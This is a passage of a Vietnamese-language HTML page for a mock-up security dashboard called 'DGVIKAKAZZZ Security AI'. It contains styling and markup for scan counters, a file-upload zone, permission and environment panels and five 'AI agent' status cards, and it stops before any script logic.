<!doctype html>
<html lang="vi">
 <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DGVIKAKAZZZ Security AI v87</title>
  <script src="/_sdk/element_sdk.js"></script>
  <style>
    html, body {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
      color: #ffffff;
      overflow-x: hidden;
      position: relative;
    }

    * {
      box-sizing: border-box;
    }

    .menu-button-fixed {
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 10000;
      background: rgba(0, 212, 255, 0.1);
      border: 2px solid rgba(0, 212, 255, 0.3);
      border-radius: 8px;
      padding: 10px 16px;
      cursor: pointer;
      color: #00d4ff;
      font-size: 24px;
      transition: all 0.3s;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
    }

    .menu-button-fixed:hover {
      background: rgba(0, 212, 255, 0.2);
      border-color: #00d4ff;
      transform: scale(1.05);
      box-shadow: 0 6px 20px rgba(0, 212, 255, 0.5);
    }

    .menu-dropdown-fixed {
      display: none;
      position: fixed;
      top: 70px;
      right: 20px;
      background: rgba(15, 23, 42, 0.98);
      border: 2px solid rgba(0, 212, 255, 0.5);
      border-radius: 12px;
      padding: 15px;
      min-width: 200px;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
      z-index: 9999;
      backdrop-filter: blur(10px);
    }

    .lang-btn {
      width: 100%;
      padding: 10px;
      background: rgba(30, 41, 59, 0.6);
      border: 1px solid rgba(136, 146, 176, 0.3);
      border-radius: 8px;
      color: #8892b0;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s;
      margin-bottom: 8px;
    }

    .lang-btn:hover {
      background: rgba(30, 41, 59, 0.8);
      border-color: rgba(136, 146, 176, 0.5);
      color: #a0aec0;
    }

    .lang-btn.active {
      background: rgba(0, 212, 255, 0.15);
      border: 2px solid #00d4ff;
      color: #00d4ff;
      box-shadow: 0 2px 8px rgba(0, 212, 255, 0.3);
    }

    .main-wrapper {
      width: 100%;
      min-height: 100%;
      padding: 30px 20px;
      position: relative;
      z-index: 1;
    }

    .app-header {
      text-align: center;
      margin-bottom: 30px;
    }

    .app-header h1 {
      font-size: 38px;
      margin: 0 0 8px 0;
      background: linear-gradient(135deg, #00d4ff 0%, #0099ff 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      font-weight: 700;
    }

    .app-header p {
      color: #8892b0;
      margin: 0;
      font-size: 16px;
    }

    .version-badge {
      display: inline-block;
      background: linear-gradient(135deg, #a855f7 0%, #7c3aed 100%);
      padding: 4px 12px;
      border-radius: 12px;
      font-size: 11px;
      font-weight: 700;
      margin-left: 10px;
      box-shadow: 0 2px 8px rgba(168, 85, 247, 0.3);
    }

    .content-container {
      max-width: 1400px;
      margin: 0 auto;
    }

    .env-panel {
      background: linear-gradient(135deg, rgba(168, 85, 247, 0.15) 0%, rgba(124, 58, 237, 0.15) 100%);
      border: 2px solid #a855f7;
      border-radius: 16px;
      padding: 25px;
      margin-bottom: 25px;
      box-shadow: 0 8px 32px rgba(168, 85, 247, 0.3);
    }

    .env-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 15px;
      margin-top: 15px;
    }

    .env-item {
      background: rgba(15, 23, 42, 0.6);
      padding: 15px;
      border-radius: 8px;
      border-left: 4px solid;
    }

    .env-item.detected {
      border-color: #2ed573;
    }

    .env-item.not-detected {
      border-color: #8892b0;
    }

    .env-label {
      font-size: 11px;
      color: #8892b0;
      text-transform: uppercase;
      margin-bottom: 5px;
    }

    .env-value {
      font-size: 16px;
      font-weight: 600;
      color: #ffffff;
    }

    .permission-panel {
      background: linear-gradient(135deg, rgba(0, 212, 255, 0.1) 0%, rgba(0, 153, 255, 0.1) 100%);
      border: 2px solid #00d4ff;
      border-radius: 16px;
      padding: 25px;
      margin-bottom: 25px;
    }

    .permission-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 12px;
      margin-top: 15px;
    }

    .permission-item {
      background: rgba(15, 23, 42, 0.7);
      padding: 15px;
      border-radius: 8px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border: 1px solid rgba(0, 212, 255, 0.2);
    }

    .permission-info {
      flex: 1;
    }

    .permission-name {
      font-weight: 600;
      font-size: 14px;
      margin-bottom: 3px;
    }

    .permission-desc {
      font-size: 11px;
      color: #8892b0;
    }

    .permission-status {
      padding: 5px 12px;
      border-radius: 12px;
      font-size: 11px;
      font-weight: 700;
    }

    .permission-status.granted {
      background: rgba(46, 213, 115, 0.2);
      color: #2ed573;
    }

    .permission-status.denied {
      background: rgba(255, 71, 87, 0.2);
      color: #ff4757;
    }

    .permission-status.pending {
      background: rgba(255, 165, 2, 0.2);
      color: #ffa502;
    }

    .btn-request-all {
      width: 100%;
      padding: 15px;
      background: linear-gradient(135deg, #00d4ff 0%, #0099ff 100%);
      border: none;
      border-radius: 12px;
      color: white;
      font-weight: 700;
      font-size: 16px;
      cursor: pointer;
      margin-top: 15px;
      transition: all 0.3s;
      box-shadow: 0 6px 20px rgba(0, 212, 255, 0.4);
    }

    .btn-request-all:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 30px rgba(0, 212, 255, 0.6);
    }

    .dashboard-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 20px;
      margin-bottom: 25px;
    }

    .status-card {
      background: linear-gradient(135deg, rgba(30, 41, 59, 0.85) 0%, rgba(22, 33, 62, 0.85) 100%);
      border-radius: 16px;
      padding: 28px;
      border: 1px solid rgba(0, 212, 255, 0.25);
      transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
      backdrop-filter: blur(12px);
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
    }

    .status-card:hover {
      border-color: rgba(0, 212, 255, 0.6);
      transform: translateY(-6px) scale(1.02);
      box-shadow: 0 12px 40px rgba(0, 212, 255, 0.35);
    }

    .card-icon {
      font-size: 56px;
      margin-bottom: 12px;
      display: block;
      filter: drop-shadow(0 6px 12px rgba(0, 212, 255, 0.5));
    }

    .card-label {
      font-size: 13px;
      color: #8892b0;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-bottom: 8px;
    }

    .card-value {
      font-size: 32px;
      font-weight: 700;
      margin: 0;
      color: #00d4ff;
    }

    .card-value.danger {
      color: #ff4757;
    }

    .card-value.warning {
      color: #ffa502;
    }

    .card-value.success {
      color: #2ed573;
    }

    .scanner-panel, .monitor-panel, .threat-list-card {
      background: linear-gradient(135deg, rgba(30, 41, 59, 0.8) 0%, rgba(22, 33, 62, 0.8) 100%);
      border-radius: 12px;
      padding: 30px;
      border: 1px solid rgba(0, 212, 255, 0.3);
      margin-bottom: 25px;
      backdrop-filter: blur(10px);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
    }

    .upload-zone {
      border: 3px dashed rgba(0, 212, 255, 0.5);
      border-radius: 12px;
      padding: 50px 30px;
      text-align: center;
      cursor: pointer;
      transition: all 0.3s ease;
      background: linear-gradient(135deg, rgba(15, 23, 42, 0.6) 0%, rgba(30, 41, 59, 0.6) 100%);
      margin-bottom: 25px;
    }

    .upload-zone:hover {
      border-color: rgba(0, 212, 255, 1);
      background: linear-gradient(135deg, rgba(15, 23, 42, 0.8) 0%, rgba(30, 41, 59, 0.8) 100%);
      transform: scale(1.01);
    }

    .file-queue {
      max-height: 300px;
      overflow-y: auto;
      margin-bottom: 25px;
    }

    .file-item {
      background: rgba(15, 23, 42, 0.7);
      padding: 15px 20px;
      margin-bottom: 10px;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border-left: 4px solid;
    }

    .file-item.scanning {
      border-color: #ffa502;
    }

    .file-item.clean {
      border-color: #2ed573;
    }

    .file-item.infected {
      border-color: #ff4757;
    }

    .file-info {
      flex: 1;
      display: flex;
      align-items: center;
      gap: 15px;
    }

    .file-icon {
      font-size: 28px;
    }

    .file-details {
      flex: 1;
    }

    .file-name {
      font-weight: 600;
      margin-bottom: 4px;
      font-size: 15px;
    }

    .file-size {
      font-size: 12px;
      color: #8892b0;
    }

    .file-status {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 14px;
      font-weight: 600;
    }

    .scanning-spinner {
      width: 18px;
      height: 18px;
      border: 3px solid rgba(255, 165, 2, 0.3);
      border-top-color: #ffa502;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .scan-progress {
      margin: 25px 0;
    }

    .progress-bar-container {
      width: 100%;
      height: 35px;
      background: rgba(15, 23, 42, 0.8);
      border-radius: 20px;
      overflow: hidden;
      position: relative;
      border: 1px solid rgba(0, 212, 255, 0.3);
      transition: all 0.3s ease;
    }

    .progress-bar-container.active-scan {
      border: 2px solid #00d4ff;
      box-shadow: 0 0 20px rgba(0, 212, 255, 0.5), 
                  0 0 40px rgba(0, 212, 255, 0.3),
                  inset 0 0 20px rgba(0, 212, 255, 0.1);
      animation: pulse-glow 2s infinite;
    }

    @keyframes pulse-glow {
      0%, 100% {
        box-shadow: 0 0 20px rgba(0, 212, 255, 0.5), 
                    0 0 40px rgba(0, 212, 255, 0.3),
                    inset 0 0 20px rgba(0, 212, 255, 0.1);
      }
      50% {
        box-shadow: 0 0 30px rgba(0, 212, 255, 0.8), 
                    0 0 60px rgba(0, 212, 255, 0.5),
                    inset 0 0 30px rgba(0, 212, 255, 0.2);
      }
    }

    .progress-bar {
      height: 100%;
      background: linear-gradient(90deg, #00d4ff 0%, #0099ff 50%, #00d4ff 100%);
      background-size: 200% 100%;
      width: 0%;
      transition: width 0.3s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 700;
      font-size: 14px;
      color: white;
      position: relative;
      overflow: hidden;
    }

    .progress-bar.scanning {
      animation: shimmer 2s infinite linear;
    }

    .progress-bar::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
      animation: scan-line 1.5s infinite;
    }

    @keyframes shimmer {
      0% {
        background-position: 200% 0;
      }
      100% {
        background-position: -200% 0;
      }
    }

    @keyframes scan-line {
      0% {
        left: -100%;
      }
      100% {
        left: 200%;
      }
    }

    .scan-status {
      text-align: center;
      margin-top: 15px;
      font-size: 15px;
      color: #8892b0;
      min-height: 20px;
    }

    .scan-detail {
      text-align: center;
      margin-top: 8px;
      font-size: 13px;
      color: #00d4ff;
      min-height: 18px;
      font-weight: 600;
    }

    button {
      padding: 15px 38px;
      font-size: 16px;
      font-weight: 600;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
    }

    .btn-scan {
      background: linear-gradient(135deg, #00d4ff 0%, #0099ff 100%);
      color: white;
      border: 1px solid rgba(0, 212, 255, 0.3);
    }

    .btn-scan:hover:not(:disabled) {
      transform: translateY(-2px) scale(1.03);
      box-shadow: 0 10px 30px rgba(0, 212, 255, 0.45);
    }

    .btn-stop {
      background: linear-gradient(135deg, #ff4757 0%, #ff3838 100%);
      color: white;
      border: 1px solid rgba(255, 71, 87, 0.3);
    }

    .btn-stop:hover:not(:disabled) {
      transform: translateY(-2px) scale(1.03);
      box-shadow: 0 10px 30px rgba(255, 71, 87, 0.45);
    }

    .btn-clear {
      background: linear-gradient(135deg, #ffa502 0%, #ff6348 100%);
      color: white;
      border: 1px solid rgba(255, 165, 2, 0.3);
    }

    .btn-clear:hover:not(:disabled) {
      transform: translateY(-2px) scale(1.03);
      box-shadow: 0 10px 30px rgba(255, 165, 2, 0.45);
    }

    .btn-control {
      padding: 12px 20px;
      font-size: 14px;
      font-weight: 600;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.3s ease;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
    }

    .btn-control:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
    }

    button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    .control-buttons {
      display: flex;
      gap: 15px;
      justify-content: center;
      flex-wrap: wrap;
      margin-top: 25px;
    }

    .threats-section {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(450px, 1fr));
      gap: 20px;
    }

    .threat-list-card h2 {
      margin: 0 0 20px 0;
      font-size: 20px;
      color: #00d4ff;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .threat-list {
      max-height: 350px;
      overflow-y: auto;
    }

    .threat-item {
      background: rgba(15, 23, 42, 0.6);
      padding: 15px;
      margin-bottom: 12px;
      border-radius: 8px;
      border-left: 4px solid;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .threat-item.critical {
      border-color: #ff4757;
    }

    .threat-item.high {
      border-color: #ffa502;
    }

    .threat-info {
      flex: 1;
    }

    .threat-name {
      font-weight: 600;
      font-size: 15px;
      margin-bottom: 5px;
      color: #ffffff;
    }

    .threat-path {
      font-size: 12px;
      color: #8892b0;
      font-family: 'Courier New', monospace;
    }

    .threat-actions {
      display: flex;
      gap: 8px;
    }

    .btn-action {
      padding: 6px 14px;
      font-size: 13px;
      border-radius: 6px;
      background: rgba(0, 212, 255, 0.2);
      color: #00d4ff;
      border: 1px solid rgba(0, 212, 255, 0.4);
      cursor: pointer;
    }

    .btn-action:hover:not(:disabled) {
      background: rgba(0, 212, 255, 0.3);
    }

    .worker-badge {
      display: inline-block;
      padding: 4px 10px;
      background: linear-gradient(135deg, #2ed573 0%, #26d07c 100%);
      color: white;
      border-radius: 12px;
      font-size: 11px;
      font-weight: 700;
      letter-spacing: 0.5px;
      box-shadow: 0 2px 8px rgba(46, 213, 115, 0.3);
    }

    .worker-badge.inactive {
      background: linear-gradient(135deg, #8892b0 0%, #64748b 100%);
    }

    .pulse-dot {
      width: 14px;
      height: 14px;
      background: #2ed573;
      border-radius: 50%;
      box-shadow: 0 0 15px rgba(46, 213, 115, 0.8);
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0%, 100% {
        opacity: 1;
        transform: scale(1);
      }
      50% {
        opacity: 0.7;
        transform: scale(1.1);
      }
    }

    .alert-popup {
      position: fixed;
      top: 20px;
      right: 20px;
      max-width: 380px;
      background: rgba(15, 23, 42, 0.98);
      border: 2px solid #ff4757;
      border-radius: 12px;
      padding: 20px;
      box-shadow: 0 10px 40px rgba(255, 71, 87, 0.5);
      z-index: 9999;
      display: none;
    }

    .alert-popup.show {
      display: block;
      animation: slideInRight 0.5s ease;
    }

    @keyframes slideInRight {
      from {
        transform: translateX(100%);
        opacity: 0;
      }
      to {
        transform: translateX(0);
        opacity: 1;
      }
    }

    .alert-header {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 12px;
    }

    .alert-icon {
      font-size: 32px;
    }

    .alert-title {
      font-size: 18px;
      font-weight: 700;
      color: #ff4757;
      margin: 0;
    }

    .alert-message {
      font-size: 14px;
      color: #ffffff;
      margin: 0 0 8px 0;
      line-height: 1.5;
    }

    .alert-time {
      font-size: 12px;
      color: #8892b0;
      margin: 0;
    }

    .close-alert {
      position: absolute;
      top: 15px;
      right: 15px;
      background: none;
      border: none;
      color: #8892b0;
      font-size: 20px;
      cursor: pointer;
      padding: 0;
      width: 24px;
      height: 24px;
    }

    .close-alert:hover {
      color: #ffffff;
    }

    .admin-message {
      background: rgba(168, 85, 247, 0.15);
      border: 2px solid #a855f7;
      border-radius: 12px;
      padding: 15px;
      margin: 15px 0;
      animation: slideIn 0.5s ease;
    }

    @keyframes slideIn {
      from {
        transform: translateX(-20px);
        opacity: 0;
      }
      to {
        transform: translateX(0);
        opacity: 1;
      }
    }

    .admin-badge {
      display: inline-block;
      background: linear-gradient(135deg, #a855f7 0%, #7c3aed 100%);
      color: white;
      padding: 4px 12px;
      border-radius: 12px;
      font-size: 11px;
      font-weight: 700;
      margin-bottom: 8px;
    }

    .activity-log {
      max-height: 250px;
      overflow-y: auto;
      background: rgba(15, 23, 42, 0.5);
      border-radius: 8px;
      padding: 15px;
    }

    .activity-item {
      padding: 12px;
      margin-bottom: 10px;
      background: rgba(30, 41, 59, 0.6);
      border-radius: 6px;
      border-left: 3px solid;
      font-size: 13px;
    }

    .activity-item.info {
      border-color: #00d4ff;
    }

    .activity-item.warning {
      border-color: #ffa502;
    }

    .activity-item.danger {
      border-color: #ff4757;
    }

    .activity-timestamp {
      color: #8892b0;
      font-size: 11px;
      margin-top: 4px;
    }

    .empty-state {
      text-align: center;
      padding: 40px 20px;
      color: #8892b0;
    }

    .empty-state-icon {
      font-size: 48px;
      margin-bottom: 15px;
      display: block;
    }

    #chatMessages::-webkit-scrollbar,
    .threat-list::-webkit-scrollbar,
    .file-queue::-webkit-scrollbar,
    .activity-log::-webkit-scrollbar {
      width: 8px;
    }

    #chatMessages::-webkit-scrollbar-track,
    .threat-list::-webkit-scrollbar-track,
    .file-queue::-webkit-scrollbar-track,
    .activity-log::-webkit-scrollbar-track {
      background: rgba(15, 23, 42, 0.5);
      border-radius: 4px;
    }

    #chatMessages::-webkit-scrollbar-thumb,
    .threat-list::-webkit-scrollbar-thumb,
    .file-queue::-webkit-scrollbar-thumb,
    .activity-log::-webkit-scrollbar-thumb {
      background: rgba(0, 212, 255, 0.5);
      border-radius: 4px;
    }

    @media (max-width: 768px) {
      .app-header h1 {
        font-size: 28px;
      }

      .dashboard-grid {
        grid-template-columns: 1fr;
      }

      .threats-section {
        grid-template-columns: 1fr;
      }

      .menu-button-fixed {
        top: 10px;
        right: 10px;
      }

      .menu-dropdown-fixed {
        top: 60px;
        right: 10px;
      }
    }
  </style>
  <style>@view-transition { navigation: auto; }</style>
  <script src="/_sdk/data_sdk.js" type="text/javascript"></script>
  <script src="https://cdn.tailwindcss.com" type="text/javascript"></script>
 </head>
 <body><button class="menu-button-fixed" id="menuToggle">‚ò∞</button>
  <div class="menu-dropdown-fixed" id="menuDropdown">
   <div style="color: #8892b0; font-size: 12px; font-weight: 600; margin-bottom: 10px; text-align: center;">
    CH·ªåN NG√îN NG·ªÆ
   </div><button id="langVi" class="lang-btn active">üáªüá≥ Ti·∫øng Vi·ªát ‚úì</button> <button id="langEn" class="lang-btn">üá∫üá∏ English</button>
  </div>
  <div class="main-wrapper">
   <header class="app-header">
    <div style="font-size: 72px; margin-bottom: 10px;">
     üõ°Ô∏è
    </div>
    <h1>DGVIKAKAZZZ Security AI <span class="version-badge">v87 ULTRA</span></h1>
    <p style="display: flex; align-items: center; justify-content: center; gap: 8px; flex-wrap: wrap;"><span style="font-size: 18px;">üîç</span> <span id="headerSubtitle">H·ªá th·ªëng qu√©t b·∫£o m·∫≠t AI - T·ª± ƒë·ªông ph√°t hi·ªán m√¥i tr∆∞·ªùng</span> <span style="font-size: 18px;">ü§ñ</span></p>
   </header>
   <main class="content-container">
    <div class="env-panel" style="display: none;">
     <h2 style="margin: 0 0 15px 0; color: #a855f7; display: flex; align-items: center; gap: 10px;"><span>üåê Ph√°t hi·ªán mÔøΩÔøΩi tr∆∞·ªùng</span></h2>
     <div class="env-grid">
      <div class="env-item" id="envBrowser">
       <div class="env-label">
        üåê WEB BROWSER
       </div>
       <div class="env-value" id="browserStatus">
        ƒêang ki·ªÉm tra...
       </div>
      </div>
      <div class="env-item" id="envMobile">
       <div class="env-label">
        üì± MOBILE DEVICE
       </div>
       <div class="env-value" id="mobileStatus">
        ƒêang ki·ªÉm tra...
       </div>
      </div>
      <div class="env-item" id="envApp">
       <div class="env-label">
        üì≤ NATIVE APP
       </div>
       <div class="env-value" id="appStatus">
        ÔøΩÔøΩang ki·ªÉm tra...
       </div>
      </div>
      <div class="env-item" id="envPlatform">
       <div class="env-label">
        üíª N·ªÄN T·∫¢NG
       </div>
       <div class="env-value" id="platformStatus">
        ƒêang ki·ªÉm tra...
       </div>
      </div>
     </div>
    </div>
    <div class="permission-panel" style="display: none;">
     <h2 style="margin: 0 0 10px 0; color: #00d4ff; display: flex; align-items: center; gap: 10px;"><span>üîê Qu·∫£n l√Ω quy·ªÅn truy c·∫≠p</span></h2>
     <p style="margin: 0 0 15px 0; font-size: 13px; color: #8892b0;">T·ª± ƒë·ªông y√™u c·∫ßu quy·ªÅn ph√π h·ª£p v·ªõi m√¥i tr∆∞·ªùng: <span id="envMode" style="color: #00d4ff; font-weight: 600;">ƒêang ph√°t hi·ªán...</span></p>
     <div class="permission-grid" id="permissionGrid">
     </div><button class="btn-request-all" id="requestAllBtn"> üöÄ Y√™u cÔøΩÔøΩÔøΩu t·∫•t c·∫£ quy·ªÅn ph√π h·ª£p </button>
    </div>
    <div id="adminMessagesContainer"></div>
    <div class="monitor-panel" style="border: 2px solid #a855f7;">
     <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 15px;">
      <div>
       <h2 style="margin: 0; color: #a855f7; display: flex; align-items: center; gap: 10px; flex-wrap: wrap;"><span id="aiSystemTitle">ü§ñ H·ªá th·ªëng b·∫£o m·∫≠t ƒëa AI</span> <span id="aiMonitorBadge" class="worker-badge inactive">KH√îNG HO·∫†T ƒê·ªòNG</span></h2>
       <p style="margin: 5px 0 0 0; font-size: 13px; color: #8892b0;" id="aiSystemDesc">5 AI Agents + T·ª± ƒë·ªông ch·∫∑n - B·∫£o v·ªá th·ªùi gian th·ª±c</p>
      </div>
      <div style="display: flex; gap: 10px; flex-wrap: wrap;"><button class="btn-control" id="toggleAIMonitorBtn" style="background: linear-gradient(135deg, #a855f7 0%, #7c3aed 100%);"> Tri·ªÉn khai AI </button>
      </div>
     </div>
     <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; background: rgba(15, 23, 42, 0.7); padding: 20px; border-radius: 8px; margin-bottom: 15px;">
      <div>
       <div style="font-size: 11px; color: #8892b0; margin-bottom: 5px;" id="activeAILabel">
        ü§ñ AI HO·∫†T ƒê·ªòNG
       </div>
       <div style="font-size: 28px; font-weight: 700; color: #a855f7;" id="activeAICount">
        0/5
       </div>
      </div>
      <div>
       <div style="font-size: 11px; color: #8892b0; margin-bottom: 5px;" id="totalScansLabel">
        T·ªîNG QU√âT
       </div>
       <div style="font-size: 28px; font-weight: 700; color: #00d4ff;" id="aiScans">
        0
       </div>
      </div>
      <div>
       <div style="font-size: 11px; color: #8892b0; margin-bottom: 5px;" id="threatsBlockedLabel">
        M·ªêI ƒêE D·ªåA CH·∫∂N
       </div>
       <div style="font-size: 28px; font-weight: 700; color: #ff4757;" id="aiDetections">
        0
       </div>
      </div>
      <div>
       <div style="font-size: 11px; color: #8892b0; margin-bottom: 5px;" id="autoBlocksLabel">
        T·ª∞ ƒê·ªòNG CH·∫∂N
       </div>
       <div style="font-size: 28px; font-weight: 700; color: #2ed573;" id="autoBlocks">
        0
       </div>
      </div>
     </div>
     <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 12px; margin-bottom: 15px;">
      <div style="background: rgba(168, 85, 247, 0.1); border: 2px solid #a855f7; border-radius: 8px; padding: 12px;">
       <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
        <div style="font-size: 24px;">
         üîç
        </div>
        <div style="flex: 1;">
         <div style="font-weight: 600; color: #a855f7; font-size: 14px;" id="ai1Name">
          Gi√°m s√°t b·ªô nh·ªõ
         </div>
         <div style="font-size: 11px; color: #8892b0;" id="ai1Status">
          Kh√¥ng ho·∫°t ƒë·ªông
         </div>
        </div>
        <div class="pulse-dot" id="ai1Indicator" style="display: none; width: 10px; height: 10px; background: #a855f7;"></div>
       </div>
       <div style="font-size: 11px; color: #ffffff; opacity: 0.7;">
        <span id="ai1ScansLabel">Qu√©t:</span> <span id="ai1Scans">0</span> | <span id="ai1BlocksLabel">Ch·∫∑n:</span> <span id="ai1Blocks">0</span>
       </div>
      </div>
      <div style="background: rgba(0, 212, 255, 0.1); border: 2px solid #00d4ff; border-radius: 8px; padding: 12px;">
       <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
        <div style="font-size: 24px;">
         üåê
        </div>
        <div style="flex: 1;">
         <div style="font-weight: 600; color: #00d4ff; font-size: 14px;" id="ai2Name">
          Gi√°m s√°t m·∫°ng
         </div>
         <div style="font-size: 11px; color: #8892b0;" id="ai2Status">
          Kh√¥ng ho·∫°t ƒë·ªông
         </div>
        </div>
        <div class="pulse-dot" id="ai2Indicator" style="display: none; width: 10px; height: 10px; background: #00d4ff;"></div>
       </div>
       <div style="font-size: 11px; color: #ffffff; opacity: 0.7;">
        <span id="ai2ScansLabel">Qu√©t:</span> <span id="ai2Scans">0</span> | <span id="ai2BlocksLabel">Ch·∫∑n:</span> <span id="ai2Blocks">0</span>
       </div>
      </div>
      <div style="background: rgba(46, 213, 115, 0.1); border: 2px solid #2ed573; border-radius: 8px; padding: 12px;">
       <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
        <div style="font-size: 24px;">
         üõ°Ô∏è
        </div>
        <div style="flex: 1;">
         <div style="font-weight: 600; color: #2ed573; font-size: 14px;" id="ai3Name">
          Gi√°m s√°t ti·∫øn tr√¨nh
         </div>
         <div style="font-size: 11px; color: #8892b0;" id="ai3Status">
          Kh√¥ng ho·∫°t ƒë·ªông
         </div>
        </div>
        <div class="pulse-dot" id="ai3Indicator" style="display: none; width: 10px; height: 10px; background: #2ed573;"></div>
       </div>
       <div style="font-size: 11px; color: #ffffff; opacity: 0.7;">
        <span id="ai3ScansLabel">Qu√©t:</span> <span id="ai3Scans">0</span> | <span id="ai3BlocksLabel">Ch·∫∑n:</span> <span id="ai3Blocks">0</span>
       </div>
      </div>
      <div style="background: rgba(255, 165, 2, 0.1); border: 2px solid #ffa502; border-radius: 8px; padding: 12px;">
       <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
        <div style="font-size: 24px;">
         üîê
        </div>
        <div style="flex: 1;">
         <div style="font-weight: 600; color: #ffa502; font-size: 14px;" id="ai4Name">
          B·∫£o v·ªá d·ªØ li·ªáu
         </div>
         <div style="font-size: 11px; color: #8892b0;" id="ai4Status">
          Kh√¥ng ho·∫°t ƒë·ªông
         </div>
        </div>
        <div class="pulse-dot" id="ai4Indicator" style="display: none; width: 10px; height: 10px; background: #ffa502;"></div>
       </div>
       <div style="font-size: 11px; color: #ffffff; opacity: 0.7;">
        <span id="ai4ScansLabel">Qu√©t:</span> <span id="ai4Scans">0</span> | <span id="ai4BlocksLabel">Ch·∫∑n:</span> <span id="ai4Blocks">0</span>
       </div>
      </div>
      <div style="background: rgba(255, 71, 87, 0.1); border: 2px solid #ff4757; border-radius: 8px; padding: 12px;">
       <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
        <div style="font-size: 24px;">
         ‚ö°
        </div>
        <div style="flex: 1;">
         <div style="font-weight: 600; color: #ff4757; font-size: 14px;" id="ai5Name">
          SƒÉn l√πng m·ªëi ƒëe d·ªça
         </div>
         <div style="font-size: 11px; color: #8892b0;" id="ai5Status">
          Kh√¥ng ho·∫°t ƒë·ªông
         </div>
        </div>
        <div class="pulse-dot" id="ai5Indicator" style="display: none; width: 10px; height: 10px; background: #ff4757;"></div>
       </div>
       <div style="font-size: 11px; color: #ffffff; opacity: 0.7;">
        <span id="ai5ScansLabel">Qu√©t:</span> <span id="ai5Scans">0</span> | <span id="ai5BlocksLabel">Ch·∫∑n:</span> <span id="ai5Blocks">0</span>
       </div>
      </div>
     </div>
    </div>
    <div class="dashboard-grid">
     <div class="status-card"><span class="card-icon">ü¶†</span>
      <div class="card-label" id="virusLabel">
       Virus ph√°t hi·ªán
      </div>
      <p class="card-value danger" id="virusCount">0</p>
     </div>
     <div class="status-card"><span class="card-icon">üìÅ</span>
      <div class="card-label" id="scannedLabel">
       File ƒë√£ qu√©t
      </div>
      <p class="card-value" id="scannedCount">0</p>
     </div>
     <div class="status-card"><span class="card-icon">‚úÖ</span>
      <div class="card-label" id="cleanLabel">
       File s·∫°ch
      </div>
      <p class="card-value success" id="cleanCount">0</p>
     </div>
     <div class="status-card"><span class="card-icon">üîí</span>
      <div class="card-label" id="quarantineLabel">
       ƒê√£ c√°ch ly
      </div>
      <p class="card-value warning" id="quarantineCount">0</p>
     </div>
    </div>
    <div class="scanner-panel">
     <h2 style="margin: 0 0 20px 0; color: #00d4ff;" id="uploadTitle">T·∫£i l√™n &amp; T·ª± ƒë·ªông qu√©t</h2>
     <div class="upload-zone" id="uploadZone"><input type="file" id="fileInput" multiple accept="*/*" style="display: none;">
      <div class="upload-content">
       <div style="font-size: 64px; margin-bottom: 15px;">
        üì§
       </div>
       <p style="margin: 0 0 10px 0; font-size: 18px; font-weight: 600;" id="dragDropText">K√©o th·∫£ ho·∫∑c Click ƒë·ªÉ ch·ªçn</p>
       <p style="margin: 0; color: #8892b0; font-size: 14px;" id="autoScanText">T·ª± ƒë·ªông qu√©t khi t·∫£i l√™n - H·ªó tr·ª£ nhi·ªÅu file</p>
      </div>
     </div>
     <div class="file-queue" id="fileQueue"></div>
     <h2 style="margin: 30px 0 20px 0; color: #00d4ff;" id="deepScanTitle">üî• Qu√©t s√¢u h·ªá th·ªëng (15 Module)</h2>
     <div class="scan-progress">
      <div class="progress-bar-container">
       <div class="progress-bar" id="progressBar">
        0%
       </div>
      </div>
      <div class="scan-status" id="scanStatus">
       S·∫µn s√†ng qu√©t s√¢u h·ªá th·ªëng
      </div>
